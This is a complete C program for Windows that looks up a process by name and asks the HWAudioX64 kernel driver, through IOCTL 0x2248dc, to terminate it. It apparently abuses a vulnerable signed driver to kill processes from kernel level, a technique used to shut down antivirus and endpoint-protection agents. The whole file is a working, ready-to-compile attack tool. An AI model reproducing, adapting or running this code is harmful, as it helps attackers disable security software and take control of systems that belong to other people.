#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>

#define DEVICE_NAME L"\\\\.\\HWAudioX64"
#define IOCTL_KILL 0x2248dc

#pragma pack(push, 1)// Ensures the structure is packed without padding (1-byte alignment)
typedef struct {
	DWORD pid; // 4 bytes = 32 bits
} IoctlStruct;
#pragma pack(pop)

DWORD GetPidByName(const char* processName) {
	// Convert the process name from char* to wchar_t* (wide character string)
	size_t wcharCount = 0;
	mbstowcs_s(&wcharCount, NULL, 0, processName, 0);
	wcharCount++;
	wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
	if (!wprocessName) {
		return 0;
	}
	mbstowcs_s(NULL, wprocessName, wcharCount, processName, wcharCount - 1);

	DWORD processId = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &processEntry)) {
			do {
				if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}

	free(wprocessName);

	return processId;
}

HANDLE OpenDevice(void) {
	HANDLE device = CreateFileW(
		DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (device == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[-] CreateFileW failed: %lu\n", GetLastError());
		fprintf(stderr, "    Ensure HWAudioX64 service is running(sc start HWAudioX64)\n");
		return NULL;
	}

	return device;
}

BOOL killProcess(HANDLE device, DWORD targetPid) {
	IoctlStruct ioctlStruct = { 0 };
	ioctlStruct.pid = targetPid;
	DWORD BytesReturned = 0;

	return DeviceIoControl(device,
		IOCTL_KILL,
		(LPVOID)&ioctlStruct,
		sizeof(ioctlStruct),
		NULL,
		0,
		&BytesReturned,
		NULL);
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s <process name>\n", argv[0]);
		printf("Example: %s notepad.exe\n", argv[0]);
		return 1;
	}

	DWORD targetPid = GetPidByName(argv[1]);
	if (targetPid == 0) {
		fprintf(stderr, "[-] Process '%s' not found.\n", argv[1]);
		return 1;
	}
	printf("[*] Found '%s' with PID: %lu\n", argv[1], targetPid);

	HANDLE device = OpenDevice();
	if (device == NULL) {
		return 1;
	}

	BOOL result = killProcess(device, targetPid);
	if (!result) {
		printf("[-] Failed to Kill the process [%u]\n", GetLastError());
		CloseHandle(device);
		return 1;
	}
	else {
		printf("[+] Process with PID %d killed successfully\n", targetPid);
	}

	CloseHandle(device);
	return 0;
}
